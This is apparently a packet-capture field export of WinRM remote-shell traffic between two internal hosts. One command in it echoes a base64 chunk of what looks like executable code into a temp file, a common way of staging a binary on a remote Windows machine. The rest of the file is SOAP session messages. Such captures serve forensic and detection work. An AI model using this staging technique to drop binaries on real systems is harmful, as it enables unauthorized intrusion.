frame.number	ip.src	tcp.srcport	ip.dst	tcp.dstport	http.file_data
2832	192.168.1.3	33397	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:528256a9-b117-f4f5-7c2c-bfc18dd40b0a</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command</a:Action><w:OptionSet><w:Option Name="WINRS_CONSOLEMODE_STDIN">TRUE</w:Option><w:Option Name="WINRS_SKIP_CMD_SHELL">FALSE</w:Option></w:OptionSet><w:SelectorSet><w:Selector Name="ShellId">7B61BA54-A2C4-4EA7-8414-28D678076F3A</w:Selector></w:SelectorSet>\n    </env:Header>\n     <env:Body>\n      <rsp:CommandLine>\n        <rsp:Command>&quot;echo 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>>%TEMP%\QvnxI.b64&quot;</rsp:Command>\n      </rsp:CommandLine>\n    </env:Body></env:Envelope>\n    
2834	192.168.2.2	5985	192.168.1.3	33397	<s:Envelope xml:lang="en-US" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><a:Action>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/CommandResponse</a:Action><a:MessageID>uuid:FD0A718D-98F3-4A90-A4D3-BA9F75C17BAA</a:MessageID><a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To><a:RelatesTo>uuid:528256a9-b117-f4f5-7c2c-bfc18dd40b0a</a:RelatesTo></s:Header><s:Body><rsp:CommandResponse><rsp:CommandId>47F13E8D-3E51-40AC-9B88-97C1D1FBD587</rsp:CommandId></rsp:CommandResponse></s:Body></s:Envelope>
2842	192.168.1.3	35885	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:0432a2cf-3af3-723f-bf92-6a95eb9b812d</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive</a:Action><w:SelectorSet><w:Selector Name="ShellId">7B61BA54-A2C4-4EA7-8414-28D678076F3A</w:Selector></w:SelectorSet>\n    </env:Header>\n    <env:Body>\n      <rsp:Receive>\n        <rsp:DesiredStream CommandId="47F13E8D-3E51-40AC-9B88-97C1D1FBD587">stdout stderr</rsp:DesiredStream>\n      </rsp:Receive>\n    </env:Body></env:Envelope>\n    
2844	192.168.2.2	5985	192.168.1.3	35885	
2850	192.168.1.3	35441	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:0432a2cf-3af3-723f-bf92-6a95eb9b812d</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive</a:Action><w:SelectorSet><w:Selector Name="ShellId">7B61BA54-A2C4-4EA7-8414-28D678076F3A</w:Selector></w:SelectorSet>\n    </env:Header>\n    <env:Body>\n      <rsp:Receive>\n        <rsp:DesiredStream CommandId="47F13E8D-3E51-40AC-9B88-97C1D1FBD587">stdout stderr</rsp:DesiredStream>\n      </rsp:Receive>\n    </env:Body></env:Envelope>\n    
2852	192.168.2.2	5985	192.168.1.3	35441	<s:Envelope xml:lang="en-US" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><a:Action>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/ReceiveResponse</a:Action><a:MessageID>uuid:CF023BFC-97C5-4FB7-8947-DCBBDE3972E3</a:MessageID><a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To><a:RelatesTo>uuid:0432a2cf-3af3-723f-bf92-6a95eb9b812d</a:RelatesTo></s:Header><s:Body><rsp:ReceiveResponse><rsp:CommandState CommandId="47F13E8D-3E51-40AC-9B88-97C1D1FBD587" State="http://schemas.microsoft.com/wbem/wsman/1/windows/shell/CommandState/Done"><rsp:ExitCode>0</rsp:ExitCode></rsp:CommandState></rsp:ReceiveResponse></s:Body></s:Envelope>
2860	192.168.1.3	36421	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:73775685-fd2a-6cdb-04f5-3f0754567835</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Signal</a:Action><w:SelectorSet><w:Selector Name="ShellId">7B61BA54-A2C4-4EA7-8414-28D678076F3A</w:Selector></w:SelectorSet>\n    </env:Header>\n     <env:Body>\n      <rsp:Signal CommandId="47F13E8D-3E51-40AC-9B88-97C1D1FBD587">\n        <rsp:Code>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/signal/terminate</rsp:Code>\n      </rsp:Signal>\n    </env:Body></env:Envelope>\n    
2862	192.168.2.2	5985	192.168.1.3	36421	
2868	192.168.1.3	45951	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:73775685-fd2a-6cdb-04f5-3f0754567835</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Signal</a:Action><w:SelectorSet><w:Selector Name="ShellId">7B61BA54-A2C4-4EA7-8414-28D678076F3A</w:Selector></w:SelectorSet>\n    </env:Header>\n     <env:Body>\n      <rsp:Signal CommandId="47F13E8D-3E51-40AC-9B88-97C1D1FBD587">\n        <rsp:Code>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/signal/terminate</rsp:Code>\n      </rsp:Signal>\n    </env:Body></env:Envelope>\n    
2870	192.168.2.2	5985	192.168.1.3	45951	<s:Envelope xml:lang="en-US" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><a:Action>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/SignalResponse</a:Action><a:MessageID>uuid:E1C59B3F-8B77-4841-862F-1052FC295DAA</a:MessageID><a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To><a:RelatesTo>uuid:73775685-fd2a-6cdb-04f5-3f0754567835</a:RelatesTo></s:Header><s:Body><rsp:SignalResponse/></s:Body></s:Envelope>
2878	192.168.1.3	33623	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:b8686cac-0127-f7d8-d815-ef2812b15f6d</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete</a:Action><w:SelectorSet><w:Selector Name="ShellId">7B61BA54-A2C4-4EA7-8414-28D678076F3A</w:Selector></w:SelectorSet>\n    </env:Header>\n    <env:Body/></env:Envelope>\n    
2880	192.168.2.2	5985	192.168.1.3	33623	
2887	192.168.1.3	36215	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:b8686cac-0127-f7d8-d815-ef2812b15f6d</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete</a:Action><w:SelectorSet><w:Selector Name="ShellId">7B61BA54-A2C4-4EA7-8414-28D678076F3A</w:Selector></w:SelectorSet>\n    </env:Header>\n    <env:Body/></env:Envelope>\n    
2889	192.168.2.2	5985	192.168.1.3	36215	<s:Envelope xml:lang="en-US" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><a:Action>http://schemas.xmlsoap.org/ws/2004/09/transfer/DeleteResponse</a:Action><a:MessageID>uuid:32A2F980-AEA1-4824-AFC2-D922DFF8CEBD</a:MessageID><a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To><a:RelatesTo>uuid:b8686cac-0127-f7d8-d815-ef2812b15f6d</a:RelatesTo></s:Header><s:Body></s:Body></s:Envelope>
2897	192.168.1.3	43455	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:36a9a1b1-d065-a2e8-c244-34b350b9178c</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Create</a:Action><w:OptionSet><w:Option Name="WINRS_NOPROFILE">FALSE</w:Option><w:Option Name="WINRS_CODEPAGE">437</w:Option></w:OptionSet>\n    </env:Header>\n    <env:Body>\n      <rsp:Shell>\n    <rsp:InputStreams>stdin</rsp:InputStreams>\n    <rsp:OutputStreams>stdout stderr</rsp:OutputStreams>\n    </rsp:Shell>\n    </env:Body></env:Envelope>\n    
2899	192.168.2.2	5985	192.168.1.3	43455	
2905	192.168.1.3	45291	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:36a9a1b1-d065-a2e8-c244-34b350b9178c</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Create</a:Action><w:OptionSet><w:Option Name="WINRS_NOPROFILE">FALSE</w:Option><w:Option Name="WINRS_CODEPAGE">437</w:Option></w:OptionSet>\n    </env:Header>\n    <env:Body>\n      <rsp:Shell>\n    <rsp:InputStreams>stdin</rsp:InputStreams>\n    <rsp:OutputStreams>stdout stderr</rsp:OutputStreams>\n    </rsp:Shell>\n    </env:Body></env:Envelope>\n    
